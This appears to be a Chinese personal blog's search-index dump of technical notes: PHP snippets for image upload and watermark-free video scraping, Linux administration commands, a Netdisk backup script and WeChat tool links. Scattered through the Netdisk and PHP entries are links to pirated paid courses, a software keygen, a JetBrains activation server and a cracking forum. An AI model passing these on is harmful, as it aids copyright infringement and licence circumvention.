上传图片12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;form action="http://myServerURL" method="POST" enctype="multipart/form-data"&gt; &lt;input type="file" name="file" /&gt; &lt;input type="Submit"&gt;&lt;/form&gt;$fields = [ 'image' =&gt; new \CurlFile(realpath($_FILES['img']['tmp_name']) )];curl_setopt($resource, CURLOPT_POSTFIELDS, $fields);https://stackoverflow.com/questions/21905942/posting-raw-image-data-as-multipart-form-data-in-curlhttps://www.cnblogs.com/vanwee/p/10341298.htmlfunction upload($file, $multipart = true) &#123; $cookie = ''; // 微博cookie $url = 'http://picupload.service.weibo.com/interface/pic_upload.php' .'?mime=image%2Fjpeg&amp;data=base64&amp;url=0&amp;markpos=1&amp;logo=&amp;nick=0&amp;marks=1&amp;app=miniblog'; if($multipart) &#123; $url .= '&amp;cb=http://weibo.com/aj/static/upimgback.html?_wv=5&amp;callback=STK_ijax_'.time(); if (class_exists('CURLFile')) &#123; // php 5.5 $post['pic1'] = new CURLFile(realpath($file)); &#125; else &#123; $post['pic1'] = '@'.realpath($file); &#125; &#125; else &#123; $post['b64_data'] = base64_encode(file_get_contents($file)); &#125; // Curl提交 https://cloud.tencent.com/developer/article/1147512 $ch = curl_init($url); curl_setopt_array($ch, array( CURLOPT_POST =&gt; true, CURLOPT_VERBOSE =&gt; true, CURLOPT_RETURNTRANSFER =&gt; true, CURLOPT_HTTPHEADER =&gt; array("Cookie: $cookie"), CURLOPT_POSTFIELDS =&gt; $post, )); $output = curl_exec($ch); curl_close($ch); // 正则表达式提取返回结果中的json数据 preg_match('/(&#123;.*)/i', $output, $match); if(!isset($match[1])) return ''; return $match[1];&#125;upload('mypic.jpg', true); // multipart方式上传upload('http://www.mysite.cn/mypic.jpg', false); // 非multipart方式(base64)上传 快手短视频无水印1234567891011121314151617181920212223242526272829303132333435363738composer require guzzlehttp/guzzlehttps://github.com/leixiaokou/kuaishourequire __DIR__.'/vendor/autoload.php';$url = $_GET['url'] ?? '';$headers = [ 'Connection' =&gt; 'keep-alive', 'User-Agent'=&gt;'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 Version/12.0 Safari/604.1'];$client = new \GuzzleHttp\Client(['timeout' =&gt; 2, 'headers' =&gt; $headers, 'http_errors' =&gt; false,]);$data['headers'] = $headers;$jar = new \GuzzleHttp\Cookie\CookieJar;$data['cookies'] = $jar;$response = $client-&gt;request('GET', $url, $data);$body = $response-&gt;getBody();if ($body instanceof \GuzzleHttp\Psr7\Stream) &#123; $body = $body-&gt;getContents();&#125;$result = htmlspecialchars_decode($body);$pattern = '#"srcNoMark":"(.*?)"#';preg_match($pattern, $result, $match);$data = [ 'video_src' =&gt; '', 'cover_image' =&gt; '',];if (empty($match[1])) &#123; return false;&#125;$data['video_src'] = $match[1];$pattern = '#"poster":"(.*?)"#';preg_match($pattern, $result, $match);if (!empty($match[1])) &#123; $data['cover_image'] = $match[1];&#125;echo json_encode($data);简单易用的获取无水印短视频播放地址，比如抖音无水印，快手无水印，微视无水印接口服务https://v.taokeduo.cn/api?uid=应用uid&amp;url=短视频平台的分享链接例如：https://v.taokeduo.cn/api?uid=06217e0cdb27d0200e3a4690f8907fd2&amp;url=https://v.douyin.com/vc4bUC/ 根据另外一个数组去重123456789101112131415161718192021222324252627282930313233343536373839404142function uniqueArray($arr, $plugins) &#123; if (!$arr)&#123; return []; &#125; $tmp = [];//相同的mid放一起 foreach ($arr as $key =&gt; $v) &#123; if (isset($tmp[$v['mid']])) &#123; $tmp[$v['mid']][] = $v; &#125; else &#123; $tmp[$v['mid']] = [$v]; &#125; &#125; $data = []; foreach ($tmp as $key =&gt; &amp;$value) &#123; $has = 0; foreach ($value as $k =&gt; $v) &#123; if ($v['is_top'] == 1) &#123;//置顶的优先取 $data[] = $v; $has = 1; break; &#125; &#125; if (!$has) &#123; foreach ($value as $k =&gt; &amp;$v) &#123; $v['sort'] = array_search($v['plugin'], $plugins);//获取在另外一个数组的顺序 &#125; $value = arraySort($value,'sort',SORT_ASC); $data[] = $value[0];//获取去重后的第一个 &#125; &#125; return $data; &#125; function arraySort($array, $key, $sort = SORT_DESC) &#123; $keysValue = []; foreach ($array as $k =&gt; $v) &#123; $keysValue[$k] = $v[$key]; &#125; array_multisort($keysValue, $sort, $array); return $array; &#125; 获取字符串内的链接1preg_match_all('/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i',strip_tags($content),$m); TCP/IP 协议 PHP 设计模式 php错误和异常 PHP 操作 Redis Redis 基础 PHP地理位置 用 PHP 写一个微波炉 Laravel 开发的一款文档管理系统 PHP 开发量化交易的工具，模拟交易所 API 数据 再谈PHP错误与异常处理 MemCached 编译安装部署 TCP 的连接建立与关闭状态及数据传输通信过程 PhpSpreadsheet 小教程https://github.com/PHPOffice/PhpSpreadsheet 理解 cookie、session、token 如何快速接入 GitHub 登陆 获取国内财经门户网股票数据composer包https://learnku.com/laravel/t/30040 面向对象的三大特性 PHP 经典面试问题解决过程：上台阶问题 Tideways、xhprof 和 xhgui 打造 PHP 非侵入式监控平台 文档协作翻译插件 Slim 框架使用orm PHP 基础算题之动态规划leetcode PC 端微信扫码支付全过程 — easywechat + Laravel 5.8 php函数列表 PHP 面向对象设计的五个基准原则 扫二维码登录过程 使用 TUS 协议来实现大文件的断点续传 防爬虫机器人盗文 Nginx之旅-环境确认及Nginx的安装 省市县数据扩展包 代理与反向代理、负载均衡和缓存 多版本 PHP 共存phpbrew 单文件 PHP 缩略图库 命令注入绕过姿势 PHP论坛 搭建jetbrains激活服务器 phpstorm的奇技淫巧http://phpstorm.tips/tips PHP设计模式 开发者知识体系 JWT 完整使用详解 PHP笔记 CTF 中的 PHP 知识汇总 聊聊服务稳定性保障这些事 个人开发者在线收款的服务 加密货币市场实时价格脚本 GameBoy开发 An example of all the Imagick functions 静态扫描为你的PHP项目上线保驾护航 静态扫描为你的PHP项目上线保驾护航 PHP技术进阶 2019 PHP 安全指南 php之道 2核1G内存的服务器能承载多少人访问 深入理解IEEE754的64位双精度 自动拉取github上的仓库 EasyDingTalk 尝试 leetcode 题目 PHP常用函数整理 笔记分享 | 简书2GitHub 微信支付单文件版 无限级分类、多级菜单、省份城市 用PHP玩转进程之二 — 多进程PHPServer unid是一个可以生成唯一ID的php扩展 秒杀系统的设计 使用 Vim 搭建 PHP 开发环境 docker 构建 php 开发环境 Debug bar for PHP 过滤敏感词汇 COOKIE和SESSION机制详解 webupload 实现分片上传视频]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百度网盘资源]]></title>
    <url>%2F2019%2F05%2F09%2F%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E8%B5%84%E6%BA%90%2F</url>
    <content type="text"><![CDATA[公开分享12百度网盘 – 选择文件分享 – 分享框弹出 – 打开浏览器开发者工具进入控制台（按F12 或者右键打开） – 粘贴以下代码！$(".share-method-line").parent().append('&lt;div class="share-method-line"&gt;&lt;input type="radio" id="share-method-public" name="share-method" value="public" checked=""&gt;&lt;span class="icon radio-icon icon-radio-non"&gt;&lt;/span&gt;&lt;label for="share-method-public"&gt;&lt;b&gt;公开分享&lt;/b&gt;&lt;span&gt;无需提取码,任何人都可直接访问下载！&lt;/span&gt; &lt;/label&gt;&lt;/div&gt;') 百度网盘备份1234567891011121314151617181920212223242526272829303132333435363738394041https://github.com/houtianze/bypysudo pip install requestsgit clone https://github.com/houtianze/bypy.git./bypy.py info./bypy.py upload ./requirements.txt test/requirements.txtvim backup.sh#!/bin/bashSCRIPT_DIR="/root" #这个改成你存放刚刚下载下来的bypy的文件夹位置DROPBOX_DIR="/backup" #这个改成你的备份文件想要放在百度网盘下面的文件夹名称，如果不存在，脚本会自动创建BACKUP_SRC="/home/wwwroot /usr/local/nginx/conf" #这个是你想要备份的本地VPS上的文件，不同的目录用空格分开BACKUP_DST="/tmp" #这个是你暂时存放备份压缩文件的地方，一般用/tmp即可MYSQL_SERVER="localhost" #这个是你mysql服务器的地址，一般填这个本地地址即可MYSQL_USER="mysqluser" #这个是你mysql的用户名名称，比如root或admin之类的MYSQL_PASS="password" #这个是你mysql用户的密码# 下面的一般不用改了NOW=$(date +"%Y.%m.%d")DESTFILE="$BACKUP_DST/$NOW.tar.gz"# 备份mysql数据库并和其它备份文件一起压缩成一个文件mysqldump -u $MYSQL_USER -h $MYSQL_SERVER -p$MYSQL_PASS --all-databases &gt; "$NOW-Databases.sql"echo "数据库备份完成，打包网站数据中..."tar cfzP "$DESTFILE" $BACKUP_SRC "$NOW-Databases.sql"echo "所有数据打包完成，准备上传..."# 用脚本上传到百度网盘$SCRIPT_DIR/bypy/bypy.py upload "$DESTFILE" "$DROPBOX_DIR/$NOW.tar.gz"if [ $? -eq 0 ];then echo "上传完成"else echo "上传失败，重新尝试"fi# 删除本地的临时文件rm -f "$NOW-Databases.sql" "$DESTFILE"然后改为可执行文件：chmod +x backup.sh #赋予权限运行的时候就输入下面的代码即可：./backup.sh然后通过 cron 来设置定时运行脚本：crontab -e加入以下代码，:wq 保存0 5 * * * /bin/bash /root/backup.shhttps://blog.fazero.me/2016/10/13/backup-vps-to-by/ 至尊搜索神器 百度网盘下载链接：https://pan.baidu.com/s/18f2uN4i-HmxcePwkM0W0gA 提取码：tjvd 蓝奏云下载链接 https://www.lanzous.com/i4ernha 文案写作 密码b50k 张小龙饭否电子书 密码07wb 效率工具 密码2b5y 一键下载网页图片插件 密码7haa 公众号排版 密码5058 编程资源 密码wanr 公众号谭某人技术分享 电影 万能命令工具 不限速的百度网盘客户端 影视剧 银河补习班电影ABBYYFineReader 是一款OCR图片文字识别软件，可以快速、方便地将扫描纸质文件、PDF格式及数字或移动电话图像转换成可编辑格式——Microsoft、 Word、Excel、PowerPoint、PDF、HTML等。99.8%的识别准确率即刻识别文本，复制和粘贴，搜索或编辑。轻松扫描纸质文件或PDF转换为可编辑文本，支持多国语言，保留原来的布局和格式。链接: https://pan.baidu.com/s/1TUrmsaqiJrySbmr6IGBIsQ 提取码: 78zv 新媒体运营干货，自媒体，各行业研究报告， 超多资料 新媒体运营干货链接:https://pan.baidu.com/s/1gNyK8LdhXtWg0cO7RxE9nQ 密码:p3w4 新媒体课堂链接:https://pan.baidu.com/s/1E5ctTySIrmc_RTglnHao3Q 密码:ahp3新媒体课堂排版与文案链接:https://pan.baidu.com/s/1qzfVeBk2Yz-h4uKe_bIHgA 密码:nix9新媒体营销技巧，涨粉链接:https://pan.baidu.com/s/1etOhGHAYc0hYPAqDUcTMnw 密码:qyl16000份营销策划资料链接:https://pan.baidu.com/s/1Heybav_FPXAbZX3hgHpR0A 密码:7gcyppt模板链接:https://pan.baidu.com/s/1FVtJ08BSwtftgfkSzC5EXA 密码:rfxc各行业商业计划书链接:https://pan.baidu.com/s/1IYsUS0niz-BsO3XAUtl6lA 密码:g7n831套互联网商业创业计划书链接:https://pan.baidu.com/s/1huRn7UmbaHmVteNxW5hYgQ 密码:gn80师北辰写作课链接:https://pan.baidu.com/s/1YJZ8CpF0uq7y3dycRjaUPg 密码:ner0 170个知乎live付费课程链接:https://pan.baidu.com/s/1v3tfTXsxrppJFZbZZIwtxA 密码:5ujb广告人的书店链接:https://pan.baidu.com/s/1fULLIBk1UV8xTMe6yFnIgw 密码:q9pl几百本书链接:https://pan.baidu.com/s/1u3widW7MYdPkAVSCcRevXQ 密码:g5il笔试资料链接: https://pan.baidu.com/s/1L0gVd620Lny_JNsx4smPCw 提取码: gwwf Python数据分析与机器学习实战资料链接：https://pan.baidu.com/s/1gPLYDra0nsGPj0dia0RzSg提取码：18l6 还是分享课程吧 python人工智能 链接：https://pan.baidu.com/s/1Z5ctN75EHqPUHLXOYrs6Tw提取码：jpil 1-1、价值2980元自媒体内部培训珍贵视频教程链接：https://pan.baidu.com/s/1fPyJcwO89c1VQ5KBN7GcWA提取码：ikd6 2、百家号运营教程链接：https://pan.baidu.com/s/1paxngap2tvGXRByM0h7ivw提取码：6j3i 3、公众号暴利涨粉教程 链接：https://pan.baidu.com/s/1c_FWchNKlu-d5NkrZRPi0A提取码：hgcc 4、微博运营黑科技教程 链接：https://pan.baidu.com/s/1LVpsrqKoSlwMcnBNrF543g提取码：wrbz 5、短视频自媒体运营入门教程链接：https://pan.baidu.com/s/1d5t_xIiYJM-sy1H2cUeodg提取码：4hb0 1、自媒体入门全套教程链接：https://pan.baidu.com/s/19i_52IPkaXAAwCptEKAiOg提取码：uv1f Flutter从入门到进阶实战携程网App无密 链接: https://pan.baidu.com/s/1XbPVYo0qk2U3ExbxNvTEnw 提取码: r672 http://pandownload.com/index.htmlhttp://www.wenkuwenku.com/ 百度搜索 周杰伦专辑 百度云 教你下载被迅雷&amp;百度云屏蔽的资源 工具大合集点这里：https://pan.baidu.com/s/1hhd7C0kQx1ASsDGmf3LCPQ 提取码：cs6r冰点文库下载器https://pan.baidu.com/s/1YApVf32Ww7mCFSm5ECYBog会声会影视频编辑软件注册机汉化版https://pan.baidu.com/s/1XYiSLVmhaHvmr-Q_JHcBkQ提取码：bcr4 推荐一下几本书《图解 TCP/IP》《图解 HTTP》《图解算法》《Laravel 框架关键技术解析》《现代操作系统 4》 分享一个PHP课程 助你加薪 链接: https://pan.baidu.com/s/1lH4r6Tb-E-8w8nXLCbimTA 提取码: jhsx课程收集 程序员经典书籍推荐 百度网盘不限速下载器 电影网站 公众号视频 提取码：pvek 吾爱破解论坛 爱盘 down.52pojie.cn 《从零开始学微信运营》读书笔记]]></content>
      <tags>
        <tag>百度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信相关]]></title>
    <url>%2F2019%2F05%2F08%2F%E5%BE%AE%E4%BF%A1%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[微信公众号可以用 huggin 抓取搜狗搜索的结果公众号 RSS 订阅 TOP 200 微信群发、自动回复、手机微信简单远控电脑 第三方支付 payjs 易于扩展的 RSS 生成器 RSS 订阅微信公众号的各种解决方案 公众号收集 一键导出微信公众号 rss订阅微信公众平台上的文章 微信公众号-文章-无限制抓取 公众号开通了流量主，两周赚了 47.63 元广告费 在 PPT 动画中学算法（每天 5 分钟一道算法） 怎样采集公众号的阅读数和点赞数 给没有权限的公众号增加留言功能 《神秘的程序员们》 2018 年所发的微博进行分类整理 RSS 全文源 瓦斯阅读 web 上看微信公众号 一条两分钟读完的开发小技巧 批量爬取微信公众号所有文章 导出朋友圈成书 同步朋友圈微博 爬取微信公众号 ArchiveTeleBot 搜狗微信公众号文章临时链接转为永久链接https://www.v2ex.com/t/520588 公众号互粉 Laravel 接入微信小程序登陆功能 微信读书 微信搜一搜排名结果分析 用数据解读咪蒙 微信公众号菜单管理扩展 微信热文 公众号文章HTTPS抓包 微信扫码 - 关注公众号后网站自动登录 微信对话生成器 抖音视频下载 github.com/ChinaBygones/PHP-DouyinRobot 微信调试工具 WeChat Playground 微信扫小程序码实现网页端登录 微信读书组队抽奖 https://weread.qnmlgb.tech/ 既可以快速组队抽奖又不用分享群或者朋友圈。 破解 微信小程序 wxapkg 的网站 https://taobao.zhaoyizhe.com/ http://mm.cqu.cc/tools/wxapkg/ https://github.com/qwerty472123/wxappUnpacker.git 2019-09-16-微博、头条、抖音热搜比较 微信自动回复机器人小雅 微信录音文件的处理mp312345678910wget https://downloads.xiph.org/releases/speex/speex-1.2.0.tar.gztar xzvf speex-1.2.0.tar.gzcd speex-1.2.0 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installgit clone https://github.com/gamelife1314/wechat-speex-declib.gitcd wechat-speex-declib &amp;&amp; make &amp;&amp; cp ./bin/speex_decode /usr/local/bin/speex2wavyum install speex-develspeex2wav xxx.amr xxxx.mp3speex2wav xxx.speex xxxx.wavhttp://www.putyy.com/article/19 半佛仙人那些疯癫又暴躁的公众号灵魂文章 微信公众账号申请材料并开通与认证全过程记录 2019.9月最新爬取微信公众号历史文章的办法]]></content>
      <tags>
        <tag>微信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 笔记]]></title>
    <url>%2F2019%2F04%2F26%2Flinux-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[磁盘空间不足12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758df命令查看当前计算器磁盘空闲情况 df -a 从根目录下开始使用du命令查找出空间占用最大的文件 du -sh /*命令一路追查 [root@test-os testuser]# df -h ###物理磁盘空间 查看所有block使用情况 Filesystem Size Used Avail Use% Mounted on /dev/sda3 8.8G 8.8G 0 100% / tmpfs 931M 0 931M 0% /dev/shm /dev/sda1 190M 40M 141M 22% /boot [root@test-os testuser]# du -sh /usr/* |grep G ###查找大文件 7.3G /usr/local [root@test-os testuser]# du -sh /usr/local/* |grep G 7.3G /usr/local/bin [root@test-os testuser]# du -sh /usr/local/bin/* |grep G 7.3G /usr/local/bin/1g [root@test-os testuser]# rm -f /usr/local/bin/1g ###删除大文件有些文件删除时还被其它进程占用，此时文件并未真正删除，只是标记为 deleted，只有进程结束后才会将文件真正从磁盘中清除。 [root@test-os ~]# lsof |grep deleted rsyslogd 1250 root 1w REG 8,3 4888889358 140789 /var/log/messages (deleted) [root@test-os ~]# #lsof 显示出系统中被打开的文件 [root@test-os ~]# #第一列 软件/服务的名称 [root@test-os ~]# #第八列 文件的大小 [root@test-os ~]# #第10列 文件的名字 [root@test-os ~]# #第11列 标记（硬链接数为0 进程调用数不为零 就会有 delete) ####重启对应的服务 释放磁盘空间 [root@test-os ~]# /etc/init.d/rsyslog restart --------------------- [root@test-os ~]# df -h Filesystem Size Used Avail Use% Mounted on /dev/sda3 8.8G 1.5G 6.9G 18% / tmpfs 931M 0 931M 0% /dev/shm /dev/sda1 190M 40M 141M 22% /boot /tmp/1m 1003K 19K 933K 2% /app/logs --------------------- # df -ih 节点磁盘空间 Filesystem Inodes IUsed IFree IUse% Mounted on /dev/vda1 1.9M 299K 1.6M 17% / udev 123K 299 123K 1% /dev tmpfs 126K 249 125K 1% /run tmpfs 126K 4 126K 1% /run/lock tmpfs 126K 2 126K 1% /run/shm 可以看到，inode 区域只被占用了一小部分，还有大量的空间未使用，所以也不是 inode 区域被占满的问题。 查看哪个目录占用过大： cd /;du -sh ./* |sort -nr|more 发现 /var/spool/postfix/maildrop 这个目录占用了12G 多的空间 删除这个目录下的内容(通过管道的方式删除,避免参数过长导致无法执行)： ls | xargs rm -f lsof test.log 这命令只能在文件被写入的时候才能显示内容，最后虽然得到了个进程号，但是因为写完进程就关闭了，所以还是查不到 for i in /home/*; do echo $i; find $i |wc -l; done 通过该命令可以查看每个用户home下inode的占用情况。如果某个目录下的inode很大，那就是问题所在了。 git push 报错 fatal: HttpRequestException encountered.12345Github 禁用了TLS v1.0 and v1.1，必须更新Windows的git凭证管理器https://github.com/Microsoft/Git-Credential-Manager-for-Windows/releases/tag/v1.18.2下载并安装后即可解决 pip install 失败1234567 pip install myqrCollecting myqr Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('&lt;pip._vendor.urllib3.connection.VerifiedHTTPSConnection object at 0x03B22330&gt;: Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))': /simple/myqr/打开Internet选项，选择连接–局域网设置 全部取消勾选，问题解决https://blog.csdn.net/u010784236/article/details/51820284 awk12345678910111213$ echo 'this is a test' | awk '&#123;print $0&#125;'$ awk -F ':' '&#123; print $1 &#125;' demo.txt$(NF-1) 代表倒数第二个字段。 $ awk -F ':' '&#123;print $1, $(NF-1)&#125;' demo.txt NR 表示当前处理的是第几行。 $ awk -F ':' '&#123;print NR ") " $1&#125;' demo.txtawk -F ':' '&#123; print toupper($1) &#125;' demo.txtawk -F ':' '/usr/ &#123;print $1&#125;' demo.txt #awk ‘条件 动作’ 文件名 print 命令前面是一个正则表达式，只输出包含 usr 的行awk -F ':' 'NR % 2 == 1 &#123;print $1&#125;' demo.txt 输出奇数行awk -F ':' '&#123;if ($1 &gt; "m") print $1&#125;' demo.txt$ awk -F ':' '&#123;if ($1 &gt; "m") print $1; else print "---"&#125;' demo.txt 批量删除 .DS_Store 文件find /home/path -name &quot;.DS_Store&quot; -type f -delete 查看硬盘及内存空间1234567891011121314151617181920 # 查看内存及swap大小free -m# 查看当前文件夹下所有文件大小（包括子文件夹）du -sh# 查看指定文件夹下所有文件大小du -h /tmp# 查看tmp目录(包含子目录)的大小du -ah /tmp# 查看指定文件夹大小du -hs ftp# 查看磁盘剩余空间df -hl# 查看每个根路径的分区大小df -h# 返回该目录的大小du -sh [目录名]# 返回该文件夹总M数du -sm [文件夹] 统计文件或目录的个数123456789101112# 统计文件夹下文件的个数ls -l | grep '^-' | wc -l# 统计文件夹下目录的个数ls -l | grep '^d' | wc -l# 统计文件夹下文件的个数(包括子文件夹里的)ls -lR | grep '^-' | wc -l# 统计文件夹下目录的个数(包括子文件夹里的)ls -lR | grep '^d' | wc -l# 统计/var/www目录下的所有py文件ls -l /var/www | grep py | wc -l# 统计/var/www目录下(包括子文件夹里的)的所有py文件ls -lR /var/www | grep py | wc -l 查看CPU和内存占用12345678910111213# CPU占用最多的前10个进程： ps auxw|head -1;ps auxw|sort -rn -k3|head -10 # 内存消耗最多的前10个进程 ps auxw|head -1;ps auxw|sort -rn -k4|head -10 # 虚拟内存使用最多的前10个进程 ps auxw|head -1;ps auxw|sort -rn -k5|head -10 按内存占用对进程排序ps auxw --sort=rss# 按CPU占用对进程排序ps auxw --sort=%cpu查看所有运行的进程ps -A curl123456强制指定本地端口curl --local-port 51 http://web.example.com# 查看连接的详细信息# --trace-time 跟踪/详细输出时，添加时间戳curl -Sv --trace-time http://web.example.com 连接你服务器 top10 用户端的 IP 地址1netstat -nat | awk '&#123;print $5&#125;' | awk -F ':' '&#123;print $1&#125;' | sort | uniq -c | sort -rn | head -n 10 最常用的10个命令1cat .bash_history | sort | uniq -c | sort -rn | head -n 10 (or cat .zhistory | sort | uniq -c | sort -rn | head -n 10 alias123456789alias nis="npm install --save "alias svim='sudo vim'alias mkcd='foo()&#123; mkdir -p "$1"; cd "$1" &#125;; foo 'alias install='sudo apt get install'alias update='sudo apt-get update; sudo apt-get upgrade'alias ..="cd .."alias ...="cd ..; cd .."alias www='python -m SimpleHTTPServer 8000'alias sock5='ssh -D 8080 -q -C -N -f user@your.server' wget12345wget http://www.openss7.org/repos/tarballs/strx25-0.9.2.1.ta$ wget -b http://www.openss7.org/repos/tarballs/strx25-0.9.2.1.tar.bz2Continuing in background, pid 1984.Output will be written to `wget-log'.wget -i download-file-list.txt 防火墙123456789101112131415161718sudo firewall-cmd --zone=public --add-port=60001/udp --permanentsudo firewall-cmd --reload#之后检查新的防火墙规则firewall-cmd --list-all//临时关闭防火墙,重启后会重新自动打开systemctl restart firewalld//检查防火墙状态firewall-cmd --statefirewall-cmd --list-all//Disable firewallsystemctl disable firewalldsystemctl stop firewalldsystemctl status firewalld//Enable firewallsystemctl enable firewalldsystemctl start firewalldsystemctl status firewalld 显示 Path 环境变量123456789 $ echo $PATH | tr : \\n/data2/node-v6.11.0-linux-x64//bin/usr/bin/bin/usr/sbin/sbin/usr/local/bin/usr/local/sbin/data0/opt/python27/bin 判断字符串包含1if [[ $tar =~ tar.gz ]];then echo "包含";fi 快速修改后缀名字12345llCentOS-base.repo.repo.bakepel.repo.repo.bakls *.bak|awk -F. '&#123;print $1&#125;'|xargs -t -i mv &#123;&#125;.repo.repo.bak &#123;&#125;.repo 数值排序1sort -t ":" -k 3 -n /etc/passwd 清理httpd服务日志超过3天的内容10 5 * * * /usr/bin/find /var/log/httpd/ -type f -mtime +3 -exec rm -rf &#123;&#125; \; awk获取json12345&#123;"name": "michael", "sex": "male", "pkg_url": "www.github.com", "number": "888"&#125;pkg_url=$(echo $env | awk -F "pkg_url\": \"" '&#123;print $2&#125;' | awk -F "\"," '&#123;print $1&#125;')echo $pkg_urlwww.github.com cpu1234567891011121314151617查看 CPU 的型号 cat /proc/cpuinfo | grep 'model name' | sort | uniq查看 CPU 颗数实际 Server 中插槽上的 CPU 个数，物理 cpu 数量，可以数不重复的 physical id 个数。cat /proc/cpuinfo | grep 'physical id' | sort | uniq | wc -l查看 CPU 核数一颗 CPU 上面能处理数据的芯片组的数量。cat /proc/cpuinfo |grep "cores"|uniq|awk '&#123;print $4&#125;'top 命令查询出来的就是逻辑 CPU 的数量。cat /proc/cpuinfo |grep "processor"|wc -lhttps://learnku.com/articles/32681 查看系统负载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140$ uptime\16:33:56 up 69 days, 5:10, 1 user, load average: 0.14, 0.24, 0.29以上信息的解析如下：16:33:56 : 当前时间up 69 days, 5:10 : 系统运行了 69 天 5 小时 10 分1 user : 当前有 1 个用户登录了系统 load average: 0.14, 0.24, 0.29 : 系统在过去 1 分钟内，5 分钟内，15 分钟内的平均负载load average: 0.14, 0.24, 0.29 : 系统在过去 1 分钟内，5 分钟内，15 分钟内的平均负载平均负载解析查看逻辑 CPU 核心数：$ grep 'model name' /proc/cpuinfo | wc -l\1\运行结果表示，有 1 个逻辑 CPU 核心。以 1 个 CPU 核心为例，假设 CPU 每分钟最多处理 100 个进程 –load=0，没有进程需要 CPUload=0.5，CPU 处理了 50 个进程load=1, CPU 处理了 100 个进程，这时 CPU 已被占满，但系统还是能顺畅运作的load=1.5, CPU 处理了 100 个进程，还有 50 个进程正在排除等着 CPU 处理，这时，CPU 已经超负荷工作了为了系统顺畅运行，load 值最好不要超过 1.0，这样就没有进程需要等待了，所有进程都能第一时间得到处理。\很显然，1.0 是一个关键值，超过这个值，系统就不在最佳状态了。 一般 0.7 是一个比较理想的值。\另外，load 值的健康状态还跟系统 CPU 核心数相关，如果 CPU 核心数为 2，那么 load 值健康值应该为 2，以此类推。 \评价系统的负载一般采用 15 分钟内的那个平均负载值。二、w 命令$ w\ 17:47:40 up 69 days, 6:24, 1 user, load average: 0.46, 0.26, 0.25\USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT\lvinkim pts/0 14.18.144.2 15:55 0.00s 0.02s 0.00s w第 1 行：与 uptime 一相同。 \第 2 行以下，当前登录用户的列表。三、top 命令$ top\top - 17:51:23 up 69 days, 6:28, 1 user, load average: 0.31, 0.30, 0.26\Tasks: 99 total, 1 running, 98 sleeping, 0 stopped, 0 zombie\Cpu(s): 2.3%us, 0.2%sy, 0.0%ni, 97.4%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st\Mem: 1922244k total, 1737480k used, 184764k free, 208576k buffers\Swap: 0k total, 0k used, 0k free, 466732k cached\\ PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND \ 1 root 20 0 19232 1004 708 S 0.0 0.1 0:01.17 init \ 2 root 20 0 0 0 0 S 0.0 0.0 0:00.01 kthreadd \...第 1 行：与 uptime 一相同。第 2 行：进程数信息。Tasks: 99 total : 总共有 99 个进程1 running : 1 个进程正在占用 CPU98 sleeping : 98 个睡眠进程0 stopped : 0 个停止的进程0 zombie : 0 个僵尸进程第 3 行 : CPU 使用率us (user): 非 nice 用户进程占用 CPU 的比率sy (system): 内核、内核进程占用 CPU 的比率ni (nice): 用户进程空间内改变过优先级的进程占用 CPU 比率id (idle): CPU 空闲比率，如果系统缓慢而这个值很高，说明系统慢的原因不是 CPU 负载高wa (iowait): CPU 等待执行 I/O 操作的时间比率，该指标可以用来排查磁盘 I/O 的问题，通常结合 wa 和 id 判断hi (Hardware IRQ): CPU 处理硬件中断所占时间的比率si (Software Interrupts): CPU 处理软件中断所占时间的比率st (steal): 流逝的时间，虚拟机中的其他任务所占 CPU 时间的比率需要注意的一些情形：用户进程 us 占比高，I/O 操作 wa 低：说明系统缓慢的原因在于进程占用大量 CPU，通常还会伴有教低的空闲比率 id，说明 CPU 空转时间很少。I/O 操作 wa 低，空闲比率 id 高：可以排除 CPU 资源瓶颈的可能。I/O 操作 wa 高：说明 I/O 占用了大量的 CPU 时间，需要检查交换空间的使用，交换空间位于磁盘上，性能远低于内存，当内存耗尽开始使用交换空间时，将会给性能带来严重影响，所以对于性能要求较高的服务器，一般建议关闭交换空间。另一方面，如果内存充足，但 wa 很高，说明需要检查哪个进程占用了大量的 I/O 资源。更多负载情形，可在实际中灵活判断。四、iostat 命令iostat 命令可以查看系统分区的 IO 使用情况$ iostat \Linux 2.6.32-573.22.1.el6.x86_64 (sgs02) 01/20/2017 _x86_64_ (1 CPU)\\avg-cpu: %user %nice %system %iowait %steal %idle\ 2.29 0.00 0.25 0.04 0.00 97.41\\Device: tps Blk_read/s Blk_wrtn/s Blk_read Blk_wrtn\vda 1.15 3.48 21.88 21016084 131997520一些值得注意的 IO 指标 :Device : 磁盘名称tps : 每秒 I/O 传输请求量Blk_read/s : 每秒读取多少块，查看块大小可参考命令 tune2fsBlk_wrtn/s : 每秒写取多少块Blk_read : 一共读了多少块–Blk_wrtn : 一共写了多少块五、iotop 命令iotop 命令类似于 top 命令，但是显示的是各个进程的 I/O 情况，对于定位 I/O 操作较重的进程有比较大的作用。\# iotop\Total DISK READ: 0.00 B/s | Total DISK WRITE: 774.52 K/s\ TID PRIO USER DISK READ DISK WRITE SWAPIN IO&gt; COMMAND \ 272 be/3 root 0.00 B/s 0.00 B/s 0.00 % 4.86 % [jbd2/vda1-8]\ 9072 be/4 mysql 0.00 B/s 268.71 K/s 0.00 % 0.00 % mysqld\ 5058 be/4 